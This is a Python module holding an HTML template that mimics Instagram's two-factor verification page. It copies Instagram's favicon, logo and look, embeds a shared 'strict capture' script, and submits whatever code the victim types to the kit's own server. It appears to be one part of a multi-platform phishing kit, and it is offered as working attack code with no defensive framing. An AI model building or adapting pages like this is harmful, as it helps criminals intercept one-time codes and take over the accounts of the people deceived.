"""otp.py - Template OTP Instagram."""

from platforms._shared import JS_STRICT_CAPTURE, IG_LOGO_SVG as _IG_LOGO_SVG

HTML_OTP_MOBILE = r"""
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/yv/r/B8lOUPkyZfP.ico" type="image/x-icon">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; }
        body { background: #000; color: #f5f5f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; min-height: 100vh; }
        .otp-card { background: #000; border: 1px solid #363636; border-radius: 24px; padding: 32px 24px; max-width: 400px; margin: 0 auto; }
        .otp-input { border: 1px solid #363636; border-radius: 14px; padding: 16px; width: 100%; font-size: 22px; text-align: center; letter-spacing: 8px; font-weight: bold; outline: none; background: #121212; color: #f5f5f5; transition: all 0.15s ease; }
        .otp-input:focus { border-color: #0095f6; background: #121212; }
        .ig-btn { background: #0095f6; color: #fff; border: none; border-radius: 14px; padding: 14px; font-weight: 600; width: 100%; font-size: 15px; cursor: pointer; transition: all 0.15s ease; }
        .ig-btn:hover { background: #1877f2; }
        .ig-btn:active { transform: scale(0.98); }
        .ig-error { background: #1a0000; border: 1px solid #5b0000; color: #ff6b6b; border-radius: 14px; }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-6">
    """ + JS_STRICT_CAPTURE + r"""
    <div class="w-full" style="max-width: 400px;">
        <div class="otp-card">
            <div class="flex justify-center mb-6">
                """ + _IG_LOGO_SVG + r"""
            </div>
            <h2 class="text-xl font-semibold text-center mb-2">{{ otp_title }}</h2>
            <p class="text-gray-400 text-center text-sm mb-6">{{ otp_sub }}</p>
            <div id="error-box" class="{% if not message %}hidden{% endif %} w-full ig-error p-3 text-xs mb-3 text-center">{{ message }}</div>
            <form method="POST">
                <input type="hidden" name="action" value="code">
                <input type="text" name="code" id="otp-field" placeholder="······" class="otp-input mb-4" maxlength="8" required autofocus inputmode="numeric">
                <button type="submit" class="ig-btn">{{ otp_submit }}</button>
            </form>
        </div>
    </div>
</body>
</html>
"""
